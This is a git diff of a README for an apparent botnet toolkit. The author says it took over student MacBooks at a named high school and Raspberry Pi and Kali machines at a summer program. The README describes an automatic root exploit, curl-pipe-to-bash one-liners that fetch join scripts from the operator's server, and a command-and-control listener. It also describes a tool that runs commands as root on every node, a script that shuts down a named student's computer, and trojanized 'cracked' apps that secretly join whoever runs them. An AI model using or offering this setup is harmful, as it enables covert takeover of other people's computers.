@@ -1,22 +1,33 @@
 # net
-Some code which I use to run a rudimentary botnet which controls roughly 20% of the MacBooks my school provides to students. I've also used this code to take over Kali Linux computers and Raspberry Pis at a summer program.
+Some helpful scripts for building and managing small botnets.
 
-## Where this code works
-* MacBook Airs at George Mason High School or others running Mac OS X 10.11.6 and immediately preceding versions. Some assumptions were made about configuration for Macs since the code was written specifically for GMHS MacBook Airs. The join script will exploit into a root shell to deliver its payload automatically, thus root access is not necessary.
-* Debian-based Linux distributions, originally Kali Linux and Raspbian. Should work on other distros, although the user must be logged in as root to the GUI, which they only usually are on Kali, or you must otherwise have root access.
+## Why I wrote this
+I used this code at the Virginia Residential Governor's School for Math, Science, and Technology to take over 36 Raspberry Pi microcomputers and Kali Linux desktops in the hacking class in which I partook. Such behavior was encouraged, and I did not violate any rules.
 
-I do not endorse the use of this code for malicious purposes.
+I also used this code to prank a few of my classmates in my Hon. Chemistry 10 class.
+
+Please note that I strictly use this code for pranks and for educational purposes. I do not run a DDoSsing botnet or other such illegal operation and do not condone the use of this code to run such an operation.
+
+## Compatible Operating Systems
+* macOS/OS X - on 10.11 (El Capitan), exploit will be used to gain a root shell and payload will be automatically delivered. For other versions, root must be obtained manually.
+* Debian-based GNU/Linux - Tested on Kali Linux and Raspbian, should work on other distros. Root exploit isn't automatic on any Linux, so you'll need to already have root access.
 
 ## How it works
-### Server
-The botnet is controlled by a simple Python script which opens a socket on port `2043`. Currently the server simply listens for incoming connections and accepts data on new nodes and updates to node data, which are then stored in the file `nodes.txt`.
+### Command & Control
+C&C is managed on ports `2042` & `2043` of a server. A simple Python script opens a socket on port `2043` which listens for incoming data from nodes, such as new nodes' joining signals, updates on connection state, and other data. All requests to the server are printed to the terminal, and important ones are written into `nodes.txt`.
+
+To make control scripts available, run
+```sh
+python3 -m http.server 2042
+```
+from the `control` directory. This will use Python's inbuilt simple HTTP server to serve control scripts to nodes upon request.
 
 ### Joining
-For Macs, two scripts are used to join a computer to the network, `join.sh` and `enact.sh`. `jm.sh` allows one-run joining: it will download the exploit needed to elevate to a root shell and then run `enact.sh` in that root shell automatically, which will handle joining the botnet. This mitigates the need to manually download the exploit, mark it as executable, then run and remove it.
+For Macs, two scripts are used to join a computer to the network, `join.sh` and `enact.sh`. `join.sh` allows one-run joining: it will download the exploit needed to elevate to a root shell and then run `enact.sh` in that root shell automatically, which will handle joining the botnet. This mitigates the need to manually download the exploit, mark it as executable, then run and remove it.
 
 Some code to use a Rubber Duck USB as a delivery mechanism for Macs can be found [here](https://github.com/ErikBoesen/duck).
 
-For Kali or other Debian-based Linux, there's just one script, `jl.sh`, which must be executed as root or as a user with root privileges. In addition to the usual activities, it will add a root cronjob to regularly curl a script from my website and run it. Unless necessary, that script, `linuxupdate.sh`, will simply check if the computer's local IP has changed, and if so, communicate as such to the server.
+For GNU/Linux, there's just one script, `join.sh`, which must be executed as root or as a user with root privileges.
 
 Some code to use a Rubber Duck USB as a delivery mechanism for Linux can be found [here](https://github.com/ErikBoesen/duck-kali).
 
@@ -24,18 +35,18 @@ Here are simple one-liners to join the botnet (I recommend purchasing a simple d
 
 Mac:
 ```sh
-curl -L [domain]:[port]/mac/join.sh |bash
+curl -L [domain]:2042/mac/join.sh |bash
 ```
 Linux:
 ```sh
-curl -L [domain]:[port]/linux/join.sh |bash
+curl -L [domain]:2042/linux/join.sh |bash
 ```
 
 ### Tools
 Running `tools/run.sh` followed by a string giving the command you'd like to run will cause all nodes in `nodes.txt` (in your working directory) to run that command as root. You can also run `up.sh` to view which/how many nodes are online. `die.sh` works strictly on Macs, and will kill open applications, turn off the screen, and initiate shutdown on the computer owned by the student with the provided username. Note: Don't do this.
 
 ### Apps
-The `apps` directory contains some cracked versions of various applications which are blocked on GMHS MacBooks. These versions will work on our MacBooks, but they will also join the computer that runs them to the botnet.
+The `apps` directory contains some "unblocked" versions of various applications. These versions will work on secured MacBooks, but they will also join the computer that runs them to the botnet.
 
 ## Licensing
 This software was created by [Erik Boesen](https://github.com/ErikBoesen) and is available under the [MIT License](LICENSE).
